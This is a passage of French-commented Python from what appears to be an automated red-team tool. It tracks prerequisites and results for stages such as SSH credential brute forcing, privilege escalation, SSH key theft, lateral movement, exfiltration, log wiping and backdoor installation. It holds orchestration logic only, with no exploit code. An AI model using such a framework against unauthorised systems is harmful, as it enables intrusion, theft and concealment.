        return bool(self.exec_data and self.exec_data.get("selected_cred"))
    
    def _has_exfil_data(self) -> bool:
        """Vérifie qu'il y a des données à exfiltrer."""
        return bool(self.ca_data)
    
    def _has_lateral_data(self) -> bool:
        """Vérifie qu'on a des clés et des hosts pour le lateral movement."""
        # return bool(self.ca_data)
        return bool(
            self.ca_data and
            self.ca_data.get("usable_keys") and
            self.ca_data.get("known_hosts") and
            len(self.ca_data["usable_keys"]) > 0 and
            len(self.ca_data["known_hosts"]) > 0
        )
    
    def _status_cred_ssh(self) -> str:
        """Message lisible sur l'état des credentials SSH."""
        if not self.cred_data or not self.cred_data.get("credentials"):
            return "pas encore d'identifiants SSH"
        ssh_creds = self.cred_data["credentials"].get("ssh", {})
        count = sum(
            len(creds.get("results", {}).get("founds", []))
            for creds in ssh_creds.values()
        )
        if count == 0:
            return "aucun identifiant SSH valide"
        return f"{count} identifiant(s) SSH disponible(s)"
    
    def _status_lateral(self) -> str:
        """Message lisible sur l'état du lateral movement."""
        if not self.ca_data:
            return "vol de clés SSH pas encore effectué"
        keys = len(self.ca_data.get("usable_keys", []))
        hosts = len(self.ca_data.get("known_hosts", []))
        if keys == 0 and hosts == 0:
            return "ni clé SSH, ni hôte connu"
        if keys == 0:
            return "clés SSH volées, mais aucun hôte connu"
        if hosts == 0:
            return f"{keys} clé(s) SSH volée(s), mais aucun hôte connu"
        return f"{keys} clé(s) SSH et {hosts} hôte(s) connu(s) — prêt pour la propagation"
    
    def _status_exfil(self) -> str:
        """Message lisible sur l'état des données à exfiltrer."""
        if not self.ca_data:
            return "vol de données pas encore effectué"
        has_data = bool(
            self.ca_data.get("dump_result") or
            self.ca_data.get("read_result") or
            self.ca_data.get("steal_result")
        )
        return "données disponibles à exfiltrer" if has_data else "aucune donnée à exfiltrer"
    
    def _status_selected_cred(self) -> str:
        """Message lisible sur l'état du credential sélectionné."""
        if not self.exec_data:
            return "exécution pas encore effectuée"
        cred = self.exec_data.get("selected_cred")
        if not cred:
            return "aucun identifiant SSH sélectionné"
        return f"identifiant '{cred.get('username')}' sur le port {cred.get('port')}"

    
    def _get_action_rules(self) -> Dict[str, Dict[str, Any]]:
        """
        Retourne le dictionnaire de règles de disponibilité pour chaque action.
        
        Structure de retour :
            {
                "nom_action": {
                    "prereq": callable → True si les conditions minimales sont remplies,
                    "reason": str      → message explicatif en français,
                },
                ...
            }
        
        Une action déjà effectuée reste disponible tant que son prérequis
        est satisfait — on peut la relancer autant de fois que nécessaire.
        
        La clé 'prereq_met' a été supprimée ; elle était redondante avec
        le booléen retourné par prereq().
        """
        
        return {
            "reconnaissance": {
                "prereq": lambda: True,
                "reason": "🔍 Toujours disponible — c'est la première étape",
            },
            "initial_access": {
                "prereq": lambda: bool(self.scan_data and self.scan_data.get("continue")),
                "reason": (
                    "🔑 Disponible — la reconnaissance a trouvé des ports ouverts"
                    if (self.scan_data and self.scan_data.get("continue"))
                    else "❌ Lancez d'abord la reconnaissance"
                ),
            },
            "execution": {
                "prereq": self._has_ssh_creds,
                "reason": (
                    f"⚡ Disponible — {self._status_cred_ssh()}"
                    if self._has_ssh_creds()
                    else f"❌ {self._status_cred_ssh()}"
                ),
            },
            "privilege_escalation": {
                "prereq": self._has_selected_cred,
                "reason": (
                    "🔺 Disponible — prêt à tenter l'élévation de privilèges"
                    if self._has_selected_cred()
                    else f"❌ {self._status_selected_cred()}"
                ),
            },
            "credential_access": {
                "prereq": self._has_selected_cred,
                "reason": (
                    "🕵️ Disponible — prêt à voler les identifiants et clés"
                    if self._has_selected_cred()
                    else f"❌ {self._status_selected_cred()}"
                ),
            },
            "lateral_movement": {
                "prereq": self._has_lateral_data,
                "reason": (
                    f"🕸️ Disponible — {self._status_lateral()}"
                    if self._has_lateral_data()
                    else f"❌ {self._status_lateral()}"
                ),
            },
            "exfiltration": {
                "prereq": self._has_exfil_data,
                "reason": (
                    f"📤 Disponible — {self._status_exfil()}"
                    if self._has_exfil_data()
                    else f"❌ {self._status_exfil()}"
                ),
            },
            "defense_evasion": {
                "prereq": self._has_selected_cred,
                "reason": (
                    "🧹 Disponible — prêt à effacer les traces"
                    if self._has_selected_cred()
                    else f"❌ {self._status_selected_cred()}"
                ),
            },
            "persistence": {
                "prereq": self._has_selected_cred,
                "reason": (
                    "💾 Disponible — prêt à installer des backdoors"
                    if self._has_selected_cred()
                    else f"❌ {self._status_selected_cred()}"
                ),
            },
            "report": {
                "prereq": lambda: True,
                "reason": (
                    "📊 Disponible — générer le rapport final"
                    if len(self.done_steps) > 0
                    else "❌ Aucune étape n'a encore été réalisée"
                ),
            },
        }

    def available_actions(self) -> List[str]:
        """
        Retourne les actions disponibles selon leurs prérequis.
        
        Une action déjà effectuée reste disponible — on peut la relancer
        autant de fois que nécessaire (ex: refaire un scan après avoir
        modifié la port range).
        """
        rules = self._get_action_rules()
        return [
            action for action, r in rules.items()
            if r["prereq"]()
        ]
    
    def available_actions_with_details(self) -> Dict[str, Dict[str, Any]]:
        """
        Retourne un dictionnaire détaillé de TOUTES les actions.
        
        Chaque entrée :
            {
                "available": bool,   # l'action est-elle disponible ?
                "reason":    str,    # explication en français
                "prereq":    str,    # description textuelle du prérequis
            }
        
        La clé 'prereq_met' (redondante avec 'available') a été supprimée.
        """
        rules = self._get_action_rules()
        
        # Descriptions textuelles fixes des prérequis
        prereq_text = {
            "reconnaissance":       "Aucun prérequis",
            "initial_access":       "Reconnaissance terminée avec des ports ouverts",
            "execution":            "Des identifiants SSH valides",
            "privilege_escalation": "Un identifiant SSH sélectionné (exécution faite)",
            "credential_access":    "Un identifiant SSH sélectionné (exécution faite)",
            "lateral_movement":     "Clés SSH volées ET hôtes connus",
            "exfiltration":         "Des données à exfiltrer",
            "defense_evasion":      "Un identifiant SSH sélectionné (exécution faite)",
            "persistence":          "Un identifiant SSH sélectionné (exécution faite)",
            "report":               "Au moins une étape effectuée",
        }
        
        details = {}
        for action, r in rules.items():
            available = r["prereq"]()
            details[action] = {
                "available": available,
                "reason": r["reason"] if isinstance(r["reason"], str) else (r["reason"]() if callable(r["reason"]) else r["reason"]),
                "prereq": prereq_text.get(action, "—"),
            }
        
        return details

    def get_state_summary(self) -> Dict[str, Any]:
        """Résumé complet de l'état pour le client WS (mêmes infos que le terminal)."""
        
        # ── Helper pour extraire les données des steps_results ──
        def _count_from_steps(keyword: str, field: str = None) -> int:
            """Compte les résultats dans steps_results pour un type d'étape donné."""
            count = 0
            for key, entries in self.steps_results.items():
                if keyword in key:
                    for e in entries:
                        result = e.get("result", {})
                        results = result.get("results", {})
                        if field:
                            count += results.get(field, 0)
                        else:
                            # Compte générique (ex: nombre de commandes)
                            count += len(results.get("commands", {}))
            return count
        
        def _any_success(keyword: str) -> bool:
            """Vérifie si au moins une étape a réussi."""
            for key, entries in self.steps_results.items():
                if keyword in key:
                    for e in entries:
                        result = e.get("result", {})
                        results = result.get("results", {})
                        if results.get("success_number", 0) > 0:
                            return True
                        if results.get("success", False):
                            return True
            return False
        
        def _step_done(keyword: str) -> bool:
            """Vérifie si une étape a été effectuée."""
            return any(keyword in key for key in self.steps_results)
        
        # ── Credentials SSH trouvés ──
        ssh_creds_by_port = {}
        total_ssh_creds = 0
        for key, entries in self.steps_results.items():
            if "SSH" in key and "InitialAccess" in key:
                for e in entries:
                    port = e.get("port", "?")
                    founds = e.get("result", {}).get("results", {}).get("founds", [])
                    ssh_creds_by_port[str(port)] = len(founds)
                    total_ssh_creds += len(founds)
        
        # ── Credential sélectionné ──
        selected_cred = None
        if self.exec_data and self.exec_data.get("selected_cred"):
            cred = self.exec_data["selected_cred"]
            selected_cred = {
                "username": cred.get("username"),
                "port": cred.get("port"),
            }
        
        # ── Compromised hosts (lateral) ──
        compromised_hosts = {}
        total_compromised = 0
        for key, entries in self.steps_results.items():
            if "LateralMovement" in key:
                for e in entries:
                    result = e.get("result", {})
                    hosts = result.get("results", {}).get("compromised_hosts", {})
                    compromised_hosts.update(hosts)
                    total_compromised = result.get("results", {}).get("compromised_count", len(hosts))
        
        return {
            # ── Infos générales ──
            "ip": self.ip,
            "started_at": self._started_at,
            "done_steps": list(self.done_steps),
            "steps_count": len(self.done_steps),
            
            # ── Actions disponibles ──
            "available_actions": self.available_actions(),
            "available_actions_with_details": self.available_actions_with_details(),
            
            # ── Reconnaissance ──
            "open_ports": self.scan_data.get("open_ports", []),
            "open_ports_count": len(self.scan_data.get("open_ports", [])),
            "port_function": self.scan_data.get("port_function", {}),
            "recon_done": _step_done("Reconnaissance"),
            
            # ── Initial Access ──
            "ssh_creds_found": ssh_creds_by_port,
            "total_ssh_creds": total_ssh_creds,
            "ftp_creds_count": sum(
                len(e.get("result", {}).get("results", {}).get("founds", []))
                for key, entries in self.steps_results.items()
                if "FTP" in key and "InitialAccess" in key
                for e in entries
            ),
            "http_paths_count": sum(
                len(e.get("result", {}).get("results", {}).get("founds", []))
                for key, entries in self.steps_results.items()
                if "HTTP" in key and "InitialAccess" in key
                for e in entries
            ),
            "initial_access_done": _step_done("InitialAccess"),
            
            # ── Execution ──
            "selected_cred": selected_cred,
            "commands_executed": _count_from_steps("CommandExecution"),
            "reverse_shell_done": _step_done("ReverseShell"),
            "reverse_shell_success": _any_success("ReverseShell"),
            "execution_done": _step_done("Execution"),
            
            # ── Privilege Escalation ──
            "privesc_done": _step_done("PrivilegeEscalation"),
            "privesc_success": (
                _any_success("SudoExploit") or _any_success("SUIDBinary")
            ),
            "sudo_success": _any_success("SudoExploit"),
            "suid_success": _any_success("SUIDBinary"),
            
            # ── Credential Access ──
            "credential_access_done": _step_done("CredentialAccess"),
            "hashes_extracted": _count_from_steps("PasswordFileDump", "hashes_count"),
            "bash_history_creds": _count_from_steps("BashHistoryRead", "credentials_count"),
            "ssh_keys_stolen": _count_from_steps("SSHKeyTheft", "usable_keys_count"),
            "known_hosts_count": _count_from_steps("SSHKeyTheft", "known_hosts_count"),
            "usable_keys_count": len(self.ca_data.get("usable_keys", [])),
            "known_hosts_list": [
                h.get("host") if isinstance(h, dict) else str(h)
                for h in self.ca_data.get("known_hosts", [])
            ],
            
            # ── Lateral Movement ──
            "lateral_movement_done": _step_done("LateralMovement"),
            "hosts_compromised": total_compromised,
            "compromised_hosts_summary": {
                host: (
                    info[0].get("username", "?") if isinstance(info, list) else info.get("username", "?")
                )
                for host, info in compromised_hosts.items()
            } if compromised_hosts else {},
            
            # ── Exfiltration ──
            "exfiltration_done": _step_done("Exfiltration"),
            "payloads_sent": _count_from_steps("Exfiltration", "sent_count"),
            "payloads_failed": _count_from_steps("Exfiltration", "failed_count"),
            
            # ── Defense Evasion ──
            "defense_evasion_done": _step_done("DefenseEvasion"),
            "logs_cleaned": _any_success("LogCleaner"),
            "timestomp_done": _step_done("Timestomp"),
            
            # ── Persistence ──
            "persistence_done": _step_done("Persistence"),
            "backdoors_installed": sum(1 for key in self.steps_results if "Persistence" in key),
            "ssh_key_installed": _any_success("SshKeyBackdoor"),
            "cron_installed": _step_done("CronBackdoor"),
        }